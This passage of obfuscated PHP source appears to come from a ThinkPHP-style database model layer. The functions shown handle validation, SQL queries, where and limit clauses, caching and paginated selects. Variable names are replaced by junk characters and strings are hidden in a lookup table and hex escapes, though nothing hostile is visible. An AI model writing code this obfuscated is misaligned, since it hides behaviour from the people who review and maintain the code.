isset($í¯ªÂëô[4]) ? (array) $í¯ªÂëô[4] : array(); if (isset($½û£¦úŒ[$í¯ªÂëô[0]])) { array_unshift($ê¦´åÈÇ, $½û£¦úŒ[$í¯ªÂëô[0]]); } if ($Û©ƒüı[397] == $í¯ªÂëô[3]) { $½û£¦úŒ[$í¯ªÂëô[0]] = call_user_func_array($í¯ªÂëô[1], $ê¦´åÈÇ); } else { $½û£¦úŒ[$í¯ªÂëô[0]] = call_user_func_array(array(&$this, $í¯ªÂëô[1]), $ê¦´åÈÇ); } break; case $Û©ƒüı[350]: $½û£¦úŒ[$í¯ªÂëô[0]] = $½û£¦úŒ[$í¯ªÂëô[1]]; break; case $Û©ƒüı[399]: if ($Û©ƒüı[12] === $½û£¦úŒ[$í¯ªÂëô[0]]) { unset($½û£¦úŒ[$í¯ªÂëô[0]]); } break; case $Û©ƒüı[400]: default: $½û£¦úŒ[$í¯ªÂëô[0]] = $í¯ªÂëô[1]; } if (!1 === $½û£¦úŒ[$í¯ªÂëô[0]]) { unset($½û£¦úŒ[$í¯ªÂëô[0]]); } } } } return $½û£¦úŒ; } protected function autoValidation($Å§ƒ·Ğî, $†€’É£â) { $‚‡æşƒµ =& $_SERVER[Ùæõ‰Ï’]; if (!empty($this->options[$‚‡æşƒµ[401]])) { $ü™®È¾ = $this->options[$‚‡æşƒµ[401]]; unset($this->options[$‚‡æşƒµ[401]]); } elseif (!empty($this->_validate)) { $ü™®È¾ = $this->_validate; } if (isset($ü™®È¾)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ü™®È¾ as $˜ØöğõŠ => $®Òø´Ñ‡) { if (empty($®Òø´Ñ‡[5]) || $®Òø´Ñ‡[5] == THINK_MODEL_BOTH || $®Òø´Ñ‡[5] == $†€’É£â) { if (0 == strpos($®Òø´Ñ‡[2], $‚‡æşƒµ[402]) && strpos($®Òø´Ñ‡[2], $‚‡æşƒµ[403])) { $®Òø´Ñ‡[2] = think_lang(substr($®Òø´Ñ‡[2], 2, -1)); } $®Òø´Ñ‡[3] = isset($®Òø´Ñ‡[3]) ? $®Òø´Ñ‡[3] : THINK_EXISTS_VALIDATE; $®Òø´Ñ‡[4] = isset($®Òø´Ñ‡[4]) ? $®Òø´Ñ‡[4] : $‚‡æşƒµ[404]; switch ($®Òø´Ñ‡[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Å§ƒ·Ğî, $®Òø´Ñ‡)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($‚‡æşƒµ[12] != trim($Å§ƒ·Ğî[$®Òø´Ñ‡[0]])) { if (!1 === $this->_validationField($Å§ƒ·Ğî, $®Òø´Ñ‡)) { return !1; } } break; default: if (isset($Å§ƒ·Ğî[$®Òø´Ñ‡[0]])) { if (!1 === $this->_validationField($Å§ƒ·Ğî, $®Òø´Ñ‡)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ó’ŸĞô, $£ôÒø¼ğ) { if (!1 === $this->_validationFieldItem($ó’ŸĞô, $£ôÒø¼ğ)) { if ($this->patchValidate) { $this->error[$£ôÒø¼ğ[0]] = $£ôÒø¼ğ[2]; } else { $this->error = $£ôÒø¼ğ[2]; return !1; } } return; } protected function _validationFieldItem($éÊ‘Ö§Ò, $Æ–½’Á’) { $í¸ëªÕ =& $_SERVER[Ùæõ‰Ï’]; switch (strtolower(trim($Æ–½’Á’[4]))) { case $í¸ëªÕ[397]: case $í¸ëªÕ[398]: $ªä¦¥Ş– = isset($Æ–½’Á’[6]) ? (array) $Æ–½’Á’[6] : array(); if (is_string($Æ–½’Á’[0]) && strpos($Æ–½’Á’[0], $í¸ëªÕ[50])) { $Æ–½’Á’[0] = explode($í¸ëªÕ[50], $Æ–½’Á’[0]); } if (is_array($Æ–½’Á’[0])) { foreach ($Æ–½’Á’[0] as $ñâêü‘) { $àƒ„Ù¿š[$ñâêü‘] = $éÊ‘Ö§Ò[$ñâêü‘]; } array_unshift($ªä¦¥Ş–, $àƒ„Ù¿š); } else { array_unshift($ªä¦¥Ş–, $éÊ‘Ö§Ò[$Æ–½’Á’[0]]); } if ($í¸ëªÕ[397] == $Æ–½’Á’[4]) { return call_user_func_array($Æ–½’Á’[1], $ªä¦¥Ş–); } else { return call_user_func_array(array(&$this, $Æ–½’Á’[1]), $ªä¦¥Ş–); } case $í¸ëªÕ[405]: return $éÊ‘Ö§Ò[$Æ–½’Á’[0]] == $éÊ‘Ö§Ò[$Æ–½’Á’[1]]; case $í¸ëªÕ[406]: if (is_string($Æ–½’Á’[0]) && strpos($Æ–½’Á’[0], $í¸ëªÕ[50])) { $Æ–½’Á’[0] = explode($í¸ëªÕ[50], $Æ–½’Á’[0]); } $æ‡ú¸±Ì = array(); if (is_array($Æ–½’Á’[0])) { foreach ($Æ–½’Á’[0] as $ñâêü‘) { $æ‡ú¸±Ì[$ñâêü‘] = $éÊ‘Ö§Ò[$ñâêü‘]; } } else { $æ‡ú¸±Ì[$Æ–½’Á’[0]] = $éÊ‘Ö§Ò[$Æ–½’Á’[0]]; } if (!empty($éÊ‘Ö§Ò[$this->getPk()])) { $æ‡ú¸±Ì[$this->getPk()] = array($í¸ëªÕ[407], $éÊ‘Ö§Ò[$this->getPk()]); } if ($this->where($æ‡ú¸±Ì)->find()) { return !1; } return !0; default: return $this->check($éÊ‘Ö§Ò[$Æ–½’Á’[0]], $Æ–½’Á’[1], $Æ–½’Á’[4]); } } public function check($ºœ‹±î, $íËÜµìã, $ó…·™«É = "\162\145\x67\145\x78") { $ÆÉï¤æ =& $_SERVER[Ùæõ‰Ï’]; $ó…·™«É = strtolower(trim($ó…·™«É)); switch ($ó…·™«É) { case $ÆÉï¤æ[7]: case $ÆÉï¤æ[408]: $üôï£Éû = is_array($íËÜµìã) ? $íËÜµìã : explode($ÆÉï¤æ[50], $íËÜµìã); return $ó…·™«É == $ÆÉï¤æ[7] ? in_array($ºœ‹±î, $üôï£Éû) : !in_array($ºœ‹±î, $üôï£Éû); case $ÆÉï¤æ[409]: case $ÆÉï¤æ[410]: if (is_array($íËÜµìã)) { $˜û«–”È = $íËÜµìã[0]; $şÊŞŞ¾Œ = $íËÜµìã[1]; } else { list($˜û«–”È, $şÊŞŞ¾Œ) = explode($ÆÉï¤æ[50], $íËÜµìã); } return $ó…·™«É == $ÆÉï¤æ[409] ? $ºœ‹±î >= $˜û«–”È && $ºœ‹±î <= $şÊŞŞ¾Œ : $ºœ‹±î < $˜û«–”È || $ºœ‹±î > $şÊŞŞ¾Œ; case $ÆÉï¤æ[411]: case $ÆÉï¤æ[412]: return $ó…·™«É == $ÆÉï¤æ[411] ? $ºœ‹±î == $íËÜµìã : $ºœ‹±î != $íËÜµìã; case $ÆÉï¤æ[413]: $Œêóè”Ö = mb_strlen($ºœ‹±î, $ÆÉï¤æ[414]); if (strpos($íËÜµìã, $ÆÉï¤æ[50])) { list($˜û«–”È, $şÊŞŞ¾Œ) = explode($ÆÉï¤æ[50], $íËÜµìã); return $Œêóè”Ö >= $˜û«–”È && $Œêóè”Ö <= $şÊŞŞ¾Œ; } else { return $Œêóè”Ö == $íËÜµìã; } case $ÆÉï¤æ[415]: list($ï£ØúÈŒ, $€‘ˆµñ) = explode($ÆÉï¤æ[50], $íËÜµìã); if (!is_numeric($ï£ØúÈŒ)) { $ï£ØúÈŒ = strtotime($ï£ØúÈŒ); } if (!is_numeric($€‘ˆµñ)) { $€‘ˆµñ = strtotime($€‘ˆµñ); } return NOW_TIME >= $ï£ØúÈŒ && NOW_TIME <= $€‘ˆµñ; case $ÆÉï¤æ[416]: return in_array(get_client_ip(), explode($ÆÉï¤æ[50], $íËÜµìã)); case $ÆÉï¤æ[417]: return !in_array(get_client_ip(), explode($ÆÉï¤æ[50], $íËÜµìã)); case $ÆÉï¤æ[404]: default: return $this->regex($ºœ‹±î, $íËÜµìã); } } public function query($êŞ¥î¶, $‹¾„èÊĞ = false) { $æıìòíÃ =& $_SERVER[Ùæõ‰Ï’]; if (!is_bool($‹¾„èÊĞ) && !is_array($‹¾„èÊĞ)) { $‹¾„èÊĞ = func_get_args(); array_shift($‹¾„èÊĞ); } $êŞ¥î¶ = str_replace(array($æıìòíÃ[262], $æıìòíÃ[418]), $æıìòíÃ[53], $êŞ¥î¶); $êŞ¥î¶ = $this->parseSql($êŞ¥î¶, $‹¾„èÊĞ); return $this->db->query($êŞ¥î¶); } public function execute($¨™®ÓÕ“, $®ƒíæ÷ = false) { if (!is_bool($®ƒíæ÷) && !is_array($®ƒíæ÷)) { $®ƒíæ÷ = func_get_args(); array_shift($®ƒíæ÷); } $¨™®ÓÕ“ = $this->parseSql($¨™®ÓÕ“, $®ƒíæ÷); return $this->db->execute($¨™®ÓÕ“); } protected function parseSql($„Õö€á¹, $Õª¡©“Œ) { $Ÿ²¡Ú¸‘ =& $_SERVER[Ùæõ‰Ï’]; if (!0 === $Õª¡©“Œ) { $ªÓèÔŸî = $this->_parseOptions(); $„Õö€á¹ = $this->db->parseSql($„Õö€á¹, $ªÓèÔŸî); } elseif (is_array($Õª¡©“Œ)) { $Õª¡©“Œ = array_map(array($this->db, $Ÿ²¡Ú¸‘[419]), $Õª¡©“Œ); $„Õö€á¹ = vsprintf($„Õö€á¹, $Õª¡©“Œ); } else { $„Õö€á¹ = strtr($„Õö€á¹, array($Ÿ²¡Ú¸‘[420] => $this->getTableName(), $Ÿ²¡Ú¸‘[421] => think_config($Ÿ²¡Ú¸‘[321]))); } $this->db->setModel($this->name); return $„Õö€á¹; } public function db($­¸„ò†Ü = '', $±ìï¹áŠ = '', $‹îíùÓñ = array()) { $Ûš‘çŠÊ =& $_SERVER[Ùæõ‰Ï’]; if ($Ûš‘çŠÊ[12] === $­¸„ò†Ü && $this->db) { return $this->db; } static $İıÀâ© = array(); static $«÷Ïò¿¤ = array(); if (!isset($«÷Ïò¿¤[$­¸„ò†Ü]) || isset($«÷Ïò¿¤[$­¸„ò†Ü]) && $±ìï¹áŠ && $İıÀâ©[$­¸„ò†Ü] != $±ìï¹áŠ) { if (!empty($±ìï¹áŠ) && is_string($±ìï¹áŠ) && !1 === strpos($±ìï¹áŠ, $Ûš‘çŠÊ[8])) { $±ìï¹áŠ = think_config($±ìï¹áŠ); } $­¸„ò†Ü = think_guid($±ìï¹áŠ); $«÷Ïò¿¤[$­¸„ò†Ü] = Db::getInstance($±ìï¹áŠ); } elseif (NULL === $±ìï¹áŠ) { $«÷Ïò¿¤[$­¸„ò†Ü]->close(); unset($«÷Ïò¿¤[$­¸„ò†Ü]); return; } if (!empty($‹îíùÓñ)) { if (is_string($‹îíùÓñ)) { parse_str($‹îíùÓñ, $‹îíùÓñ); } foreach ($‹îíùÓñ as $ÏùÕä²° => $â¿¯¬¸§) { $this->setProperty($ÏùÕä²°, $â¿¯¬¸§); } } $İıÀâ©[$­¸„ò†Ü] = $±ìï¹áŠ; $this->db = $«÷Ïò¿¤[$­¸„ò†Ü]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $³•§ªöæ = get_class($this); if ($³•§ªöæ == $_SERVER[Ùæõ‰Ï’][422]) { return $this->name; } $this->name = substr($³•§ªöæ, 0, -5); } return $this->name; } public function getTableName() { $íêüÄ±³ =& $_SERVER[Ùæõ‰Ï’]; if (empty($this->trueTableName)) { $íµ‘…êí = !empty($this->tablePrefix) ? $this->tablePrefix : $íêüÄ±³[12]; if (!empty($this->tableName)) { $íµ‘…êí .= $this->tableName; } else { $íµ‘…êí .= think_parse_name($this->name); } $this->trueTableName = strtolower($íµ‘…êí); } return (!empty($this->dbName) ? $this->dbName . $íêüÄ±³[10] : $íêüÄ±³[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $±×ÊÜ»£ =& $_SERVER[Ùæõ‰Ï’]; return isset($this->fields[$±×ÊÜ»£[328]]) ? $this->fields[$±×ÊÜ»£[328]] : $this->pk; } public function getDbFields() { $…¿¬œØ =& $_SERVER[Ùæõ‰Ï’]; if (isset($this->options[$…¿¬œØ[356]])) { $­ŸóãØ¯ = $this->db->getFields($this->options[$…¿¬œØ[356]]); return $­ŸóãØ¯ ? array_keys($­ŸóãØ¯) : !1; } if ($this->fields) { $­ŸóãØ¯ = $this->fields; unset($­ŸóãØ¯[$…¿¬œØ[327]], $­ŸóãØ¯[$…¿¬œØ[328]], $­ŸóãØ¯[$…¿¬œØ[329]], $­ŸóãØ¯[$…¿¬œØ[326]]); return $­ŸóãØ¯; } return !1; } public function data($€ˆ½Ì„Ä = '') { $¨»„¨È¼ =& $_SERVER[Ùæõ‰Ï’]; if ($¨»„¨È¼[12] === $€ˆ½Ì„Ä && !empty($this->data)) { return $this->data; } if (is_object($€ˆ½Ì„Ä)) { $€ˆ½Ì„Ä = get_object_vars($€ˆ½Ì„Ä); } elseif (is_string($€ˆ½Ì„Ä)) { parse_str($€ˆ½Ì„Ä, $€ˆ½Ì„Ä); } elseif (!is_array($€ˆ½Ì„Ä)) { think_exception(think_lang($¨»„¨È¼[348])); } $this->data = $€ˆ½Ì„Ä; return $this; } public function join($œ§Ü·æå) { $ÂÍ•½¾İ =& $_SERVER[Ùæõ‰Ï’]; if (is_array($œ§Ü·æå)) { $this->options[$ÂÍ•½¾İ[359]] = $œ§Ü·æå; } elseif (!empty($œ§Ü·æå)) { $this->options[$ÂÍ•½¾İ[359]][] = $œ§Ü·æå; } return $this; } public function union($óºœ²ª, $¼ÜÕğ = false) { $ƒ¡ø¿Èİ =& $_SERVER[Ùæõ‰Ï’]; if (empty($óºœ²ª)) { return $this; } if ($¼ÜÕğ) { $this->options[$ƒ¡ø¿Èİ[423]][$ƒ¡ø¿Èİ[424]] = !0; } if (is_object($óºœ²ª)) { $óºœ²ª = get_object_vars($óºœ²ª); } if (is_string($óºœ²ª)) { $€ç³™œĞ = $óºœ²ª; } elseif (is_array($óºœ²ª)) { if (isset($óºœ²ª[0])) { $this->options[$ƒ¡ø¿Èİ[423]] = array_merge($this->options[$ƒ¡ø¿Èİ[423]], $óºœ²ª); return $this; } else { $€ç³™œĞ = $óºœ²ª; } } else { think_exception(think_lang($ƒ¡ø¿Èİ[348])); } $this->options[$ƒ¡ø¿Èİ[423]][] = $€ç³™œĞ; return $this; } public function cache($øËÁğŒ = true, $Ãï†ó² = null, $˜ëÁÏÖ‘ = '') { $ÇïêÅ‚ =& $_SERVER[Ùæõ‰Ï’]; if (!1 !== $øËÁğŒ) { $this->options[$ÇïêÅ‚[425]] = array($ÇïêÅ‚[97] => $øËÁğŒ, $ÇïêÅ‚[415] => $Ãï†ó², $ÇïêÅ‚[33] => $˜ëÁÏÖ‘); } return $this; } public function field($®ĞøŸóÀ, $à¾ĞæÂâ = false) { $×ˆæñÌ =& $_SERVER[Ùæõ‰Ï’]; if (!0 === $®ĞøŸóÀ) { $ó×³ü½ë = $this->getDbFields(); $®ĞøŸóÀ = $ó×³ü½ë ? $ó×³ü½ë : $×ˆæñÌ[220]; } elseif ($à¾ĞæÂâ) { if (is_string($®ĞøŸóÀ)) { $®ĞøŸóÀ = explode($×ˆæñÌ[50], $®ĞøŸóÀ); } $ó×³ü½ë = $this->getDbFields(); $®ĞøŸóÀ = $ó×³ü½ë ? array_diff($ó×³ü½ë, $®ĞøŸóÀ) : $®ĞøŸóÀ; } $this->options[$×ˆæñÌ[350]] = $®ĞøŸóÀ; return $this; } public function scope($Çº·›Çë = '', $¡ìó–¤ = NULL) { $á«Æ“ãÈ =& $_SERVER[Ùæõ‰Ï’]; if ($á«Æ“ãÈ[12] === $Çº·›Çë) { if (isset($this->_scope[$á«Æ“ãÈ[37]])) { $É“›¨’ˆ = $this->_scope[$á«Æ“ãÈ[37]]; } else { return $this; } } elseif (is_string($Çº·›Çë)) { $ò¤æÀİ = explode($á«Æ“ãÈ[50], $Çº·›Çë); $É“›¨’ˆ = array(); foreach ($ò¤æÀİ as $”ã´ñ¢´) { if (!isset($this->_scope[$”ã´ñ¢´])) { continue; } $É“›¨’ˆ = array_merge($É“›¨’ˆ, $this->_scope[$”ã´ñ¢´]); } if (!empty($¡ìó–¤) && is_array($¡ìó–¤)) { $É“›¨’ˆ = array_merge($É“›¨’ˆ, $¡ìó–¤); } } elseif (is_array($Çº·›Çë)) { $É“›¨’ˆ = $Çº·›Çë; } if (is_array($É“›¨’ˆ) && !empty($É“›¨’ˆ)) { $this->options = array_merge($this->options, array_change_key_case($É“›¨’ˆ)); } return $this; } public function where($«ÖĞ–, $­°úÇÇÇ = null) { $òÒüÕÜ =& $_SERVER[Ùæõ‰Ï’]; if (!is_null($­°úÇÇÇ) && is_string($«ÖĞ–)) { if (!is_array($­°úÇÇÇ)) { $­°úÇÇÇ = func_get_args(); array_shift($­°úÇÇÇ); } $­°úÇÇÇ = array_map(array($this->db, $òÒüÕÜ[419]), $­°úÇÇÇ); $«ÖĞ– = vsprintf($«ÖĞ–, $­°úÇÇÇ); } elseif (is_object($«ÖĞ–)) { $«ÖĞ– = get_object_vars($«ÖĞ–); } elseif (is_array($«ÖĞ–)) { foreach ($«ÖĞ– as $§ŸÙá‚Í => $²ãàîë¹) { if ((is_numeric($§ŸÙá‚Í) || !$§ŸÙá‚Í) && is_string($²ãàîë¹)) { if (strpos($²ãàîë¹, $òÒüÕÜ[426]) === 0) { continue; } think_trace($òÒüÕÜ[427], $òÒüÕÜ[12], $òÒüÕÜ[49]); die; } } } if (is_string($«ÖĞ–) && $òÒüÕÜ[12] != $«ÖĞ–) { $õ½ö¦¤‡ = array(); $õ½ö¦¤‡[$òÒüÕÜ[428]] = $«ÖĞ–; $«ÖĞ– = $õ½ö¦¤‡; } if (isset($this->options[$òÒüÕÜ[352]])) { $this->options[$òÒüÕÜ[352]] = array_merge($this->options[$òÒüÕÜ[352]], $«ÖĞ–); } else { $this->options[$òÒüÕÜ[352]] = $«ÖĞ–; } return $this; } public function limit($ı¬Úğ¶½, $ù˜›ÈĞ– = null) { $£ş·¼Øä =& $_SERVER[Ùæõ‰Ï’]; $this->options[$£ş·¼Øä[368]] = is_null($ù˜›ÈĞ–) ? $ı¬Úğ¶½ : $ı¬Úğ¶½ . $£ş·¼Øä[50] . $ù˜›ÈĞ–; return $this; } public function page($«ÆÁ¥Âö, $³Ü‡‚ó = null) { $ï¶›²‘ù =& $_SERVER[Ùæõ‰Ï’]; $this->options[$ï¶›²‘ù[429]] = is_null($³Ü‡‚ó) ? $«ÆÁ¥Âö : $«ÆÁ¥Âö . $ï¶›²‘ù[50] . $³Ü‡‚ó; return $this; } public function comment($ãûáÕíÌ) { $this->options[$_SERVER[Ùæõ‰Ï’][430]] = $ãûáÕíÌ; return $this; } public function setProperty($éé»Ò¨Ì, $×øÜ‡û¾) { if (property_exists($this, $éé»Ò¨Ì)) { $this->{$éé»Ò¨Ì} = $×øÜ‡û¾; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\151\x66\x79\124\x69\155\x65", "\164\x69\155\x65", "\x69\156\x73\x65\162\164\x2c\x75\x70\144\x61\164\x65", "\146\x75\156\143\x74\151\x6f\x6e"), array("\143\162\145\141\164\x65\124\151\155\x65", "\164\151\x6d\145", "\151\156\163\145\x72\x74", "\x66\165\156\143\x74\151\157\156")); public function setDataAuto($ë’éÕÅ„) { $this->dataAuto = $ë’éÕÅ„; } public function __construct($şò—¹ÎÈ = '', $êêË’Åì = '', $ÚŞÎ’™ú = '') { parent::__construct($şò—¹ÎÈ, $êêË’Åì, $ÚŞÎ’™ú); } protected $tableMeta = array(); protected function _beforeInsert(&$î½Ñíñ, $«§Ù×½¨) { $¯ëá«äÇ =& $_SERVER[Ùæõ‰Ï’]; if (!$this->checkDataAutoHas($¯ëá«äÇ[431])) { return; } $this->dataBeforeFilter($î½Ñíñ, $¯ëá«äÇ[431]); } protected function _beforeUpdate(&$±­Ãö½á, $â³ãØ¿…) { $¥¾œóùË =& $_SERVER[Ùæõ‰Ï’]; if (!$this->checkDataAutoHas($¥¾œóùË[432])) { return; } $this->dataBeforeFilter($±­Ãö½á, $¥¾œóùË[432]); } protected function _afterSelect(&$­ÙøÉå, $£…îÉı“) { if (!is_array($­ÙøÉå)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ùæõ‰Ï’][433])) { return; } foreach ($­ÙøÉå as &$š¾Ãøì) { $this->dataAfterFilter($š¾Ãøì); } unset($š¾Ãøì); } protected function _afterFind(&$•Ö†Á•‹, $à¯Œ…§¢) { if (!is_array($•Ö†Á•‹)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ùæõ‰Ï’][433])) { return; } $this->dataAfterFilter($•Ö†Á•‹); } public static function textEncode($¯Şª¾Â) { if (!$¯Şª¾Â) { return $¯Şª¾Â; } $†’Ğ¥–¤ = json_encode($¯Şª¾Â); $†’Ğ¥–¤ = preg_replace_callback($_SERVER[Ùæõ‰Ï’][434], function ($ÏÖù–îÛ) { return addslashes($ÏÖù–îÛ[0]); }, $†’Ğ¥–¤); return json_decode($†’Ğ¥–¤); } public static function textDecode($ÎÔâôİÂ) { $ÊÄÊ«§¾ =& $_SERVER[Ùæõ‰Ï’]; $ÎÄ’ÑŞ„ = json_encode($ÎÔâôİÂ); $ÎÄ’ÑŞ„ = preg_replace_callback($ÊÄÊ«§¾[435], function ($ëÈŒê˜ä) { return $_SERVER[Ùæõ‰Ï’][100]; }, $ÎÄ’ÑŞ„); return json_decode($ÎÄ’ÑŞ„); } public function setAutoIncrement($äÍ…úÃæ) { $Ôíæ¬Ûğ = array($this->getPk() => $äÍ…úÃæ); $›¸½ ¸ = $this->data($Ôíæ¬Ûğ)->add(); if ($›¸½ ¸) { $this->delete($›¸½ ¸); } } public function getAutoIncrement() { $‚û·æôÁ = $this->getTableName(); $“ëŠë¢Ñ = $this->max($this->getPk()); $õïìŒ = $this->query("\x73\x68\157\167\x20\x74\141\x62\x6c\x65\x20\163\x74\x61\x74\x75\163\x20\167\150\145\162\x65\40\x4e\x61\x6d\145\75\x27{$‚û·æôÁ}\x27"); $“é‘÷‘Ê = $õïìŒ[0][$_SERVER[Ùæõ‰Ï’][436]]; $ãÛ”åæå = max($“ëŠë¢Ñ, $“é‘÷‘Ê); return $ãÛ”åæå; } protected function _callBefore($¸ËÎÉó¹, $‰Š§®Üä) { return $this->cacheCallCheck($¸ËÎÉó¹, $‰Š§®Üä, !1); } protected function _callAfter($ŒËß€Ï, $³®è¨·) { return $this->cacheCallCheck($ŒËß€Ï, $³®è¨·, !0); } protected function cacheFunctionAlias($šûŒïçâ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ùÒÂäç, $Öşá·ã–, $¬ã¾Œ§Ï = false) { $ËÈ¢”èß = $this->cacheFunctionAlias($Öşá·ã–); if (!$ËÈ¢”èß) { return; } foreach ($ËÈ¢”èß as $éÓØÍÍÔ => $ş¯½‰ôğ) { $£Ë†İ§¿ = $ş¯½‰ôğ[0]; $€¤“ÒßÉ = explode($_SERVER[Ùæõ‰Ï’][50], $ş¯½‰ôğ[1]); if ($ùÒÂäç == $éÓØÍÍÔ) { return $this->cacheFunctionGet($éÓØÍÍÔ, $£Ë†İ§¿); } if ($¬ã¾Œ§Ï && in_array($ùÒÂäç, $€¤“ÒßÉ)) { $this->cacheFunctionClear($éÓØÍÍÔ, $£Ë†İ§¿); } } } public function cacheFunctionGet($„—¸–Õğ, $‰–ãÄ°İ) { $úšúÚ©‹ = $this->cacheKeyMake($„—¸–Õğ, $‰–ãÄ°İ); $ ÄÈó–‹ = Cache::get($úšúÚ©‹); if (!is_array($ ÄÈó–‹)) { $ ÄÈó–‹ = call_user_func_array(array($this, $„—¸–Õğ), array($‰–ãÄ°İ, !0)); Cache::set($úšúÚ©‹, $ ÄÈó–‹); } return $ ÄÈó–‹; } public function cacheFunctionClear($´éÂ¶ş½, $ŞöÛÌ•) { $¾€°Ô‘ƒ = $ŞöÛÌ•; if (!is_array($ŞöÛÌ•)) { $¾€°Ô‘ƒ = array($ŞöÛÌ•); } foreach ($¾€°Ô‘ƒ as $Íµ‚é¶‚) { $¿¨•›ç = $this->cacheKeyMake($´éÂ¶ş½, $Íµ‚é¶‚); Cache::remove($¿¨•›ç); } } private function cacheKeyMake($©„Öğ¤ß, $©ãØã±) { $Ìß¨êÓ =& $_SERVER[Ùæõ‰Ï’]; return get_class($this) . $Ìß¨êÓ[11] . $©„Öğ¤ß . $Ìß¨êÓ[437] . $©ãØã±; } protected function selectPageReset() { $Š…ûÎ¼ =& $_SERVER[Ùæõ‰Ï’]; if (isset($GLOBALS[$Š…ûÎ¼[438]])) { return; } $GLOBALS[$Š…ûÎ¼[438]] = isset($GLOBALS[$Š…ûÎ¼[7]][$Š…ûÎ¼[439]]) ? $GLOBALS[$Š…ûÎ¼[7]][$Š…ûÎ¼[439]] : !1; $GLOBALS[$Š…ûÎ¼[440]] = isset($GLOBALS[$Š…ûÎ¼[7]][$Š…ûÎ¼[429]]) ? $GLOBALS[$Š…ûÎ¼[7]][$Š…ûÎ¼[429]] : !1; $GLOBALS[$Š…ûÎ¼[7]][$Š…ûÎ¼[439]] = !1; $GLOBALS[$Š…ûÎ¼[7]][$Š…ûÎ¼[429]] = !1; } protected function selectPageRestore() { $ê¡ëî’Ë =& $_SERVER[Ùæõ‰Ï’]; if (!isset($GLOBALS[$ê¡ëî’Ë[438]])) { return; } $GLOBALS[$ê¡ëî’Ë[7]][$ê¡ëî’Ë[439]] = $GLOBALS[$ê¡ëî’Ë[438]]; $GLOBALS[$ê¡ëî’Ë[7]][$ê¡ëî’Ë[429]] = $GLOBALS[$ê¡ëî’Ë[440]]; if ($GLOBALS[$ê¡ëî’Ë[7]][$ê¡ëî’Ë[439]] === !1) { unset($GLOBALS[$ê¡ëî’Ë[7]][$ê¡ëî’Ë[439]]); } if ($GLOBALS[$ê¡ëî’Ë[7]][$ê¡ëî’Ë[429]] === !1) { unset($GLOBALS[$ê¡ëî’Ë[7]][$ê¡ëî’Ë[429]]); } unset($GLOBALS[$ê¡ëî’Ë[438]]); unset($GLOBALS[$ê¡ëî’Ë[440]]); } protected function selectPage($´ñœíÑ = 200, $û•ÌÁú = 1) { $Ã‘ğÇ =& $_SERVER[Ùæõ‰Ï’]; global $in; $Úå¼˜¦ = $this->optionsValue(); $íò¼Í¨á = 50000; $´ñœíÑ = isset($in[$Ã‘ğÇ[439]]) && $in[$Ã‘ğÇ[439]] ? $in[$Ã‘ğÇ[439]] : $´ñœíÑ; if ($´ñœíÑ === -1) { $in[$Ã‘ğÇ[439]] = !1; $íò¼Í¨á = 100000000; $´ñœíÑ = $íò¼Í¨á; } $Ö˜ßºô© = $Úå¼˜¦; $Ö˜ßºô©[$Ã‘ğÇ[441]] = array(); $´ñœíÑ = intval($´ñœíÑ); $´ñœíÑ = $´ñœíÑ <= 5 ? 5 : ($´ñœíÑ >= $íò¼Í¨á ? $íò¼Í¨á : $´ñœíÑ); $û•ÌÁú = intval(isset($in[$Ã‘ğÇ[429]]) && $in[$Ã‘ğÇ[429]] ? $in[$Ã‘ğÇ[429]] : $û•ÌÁú); $û•ÌÁú = $û•ÌÁú <= 1 ? 1 : $û•ÌÁú; $áÙèäšê = array(); $ùı¥œÖ¿ = 1; if ($û•ÌÁú == 1 && $ùı¥œÖ¿) { $this->optionsValue($Úå¼˜¦); $áÙèäšê = $this->page($û•ÌÁú, $´ñœíÑ)->select(); $€Ï¢äóÁ = is_array($áÙèäšê) ? count($áÙèäšê) : 0; if ($€Ï¢äóÁ < $´ñœíÑ) { $«çÏ‹Ä¾ = 1; } else { $this->optionsValue($Ö˜ßºô©); $€Ï¢äóÁ = intval($this->count()); $«çÏ‹Ä¾ = ceil($€Ï¢äóÁ / $´ñœíÑ); } } else { $this->optionsValue($Ö˜ßºô©); $€Ï¢äóÁ = intval($this->count()); $«çÏ‹Ä¾ = ceil($€Ï¢äóÁ / $´ñœíÑ); $û•ÌÁú = $û•ÌÁú >= $«çÏ‹Ä¾ ? $«çÏ‹Ä¾ : $û•ÌÁú; $this->optionsValue($Úå¼˜¦); $áÙèäšê = $this->page($û•ÌÁú, $´ñœíÑ)->select(); } if (!is_array($áÙèäšê)) { $áÙèäšê = array(); } if ($«çÏ‹Ä¾ == 1) { $€Ï¢äóÁ = count($áÙèäšê); } $‰¸½Æ×Å = array($Ã‘ğÇ[442] => array($Ã‘ğÇ[443] => $€Ï¢äóÁ, $Ã‘ğÇ[439] => $´ñœíÑ, $Ã‘ğÇ[429] => $û•ÌÁú, $Ã‘ğÇ[444] => $«çÏ‹Ä¾), $Ã‘ğÇ[445] => $áÙèäšê); return $‰¸½Æ×Å; } protected function checkLength($Ğ¡äºà¢, $ø¢¡©² = 0, $€É¤§£ = '') { $èÑÁ¢ˆÔ =& $_SERVER[Ùæõ‰Ï’]; $ø¢¡©² = $ø¢¡©² ? $ø¢¡©² : 65536; if (!$Ğ¡äºà¢ || strlen($Ğ¡äºà¢) < $ø¢¡©²) { return; } $€É¤§£ = $€É¤§£ ? $€É¤§£ . $èÑÁ¢ˆÔ[74] : $èÑÁ¢ˆÔ[12]; show_json($€É¤§£ . LNG($èÑÁ¢ˆÔ[446]) . "\x28{$ø¢¡©²}\51", !1); } protected function metaSet($ã‹ ñû®, $Öêã”­Ä = null, $ÕóÀîÙš = null) { $÷Å½œéê =& 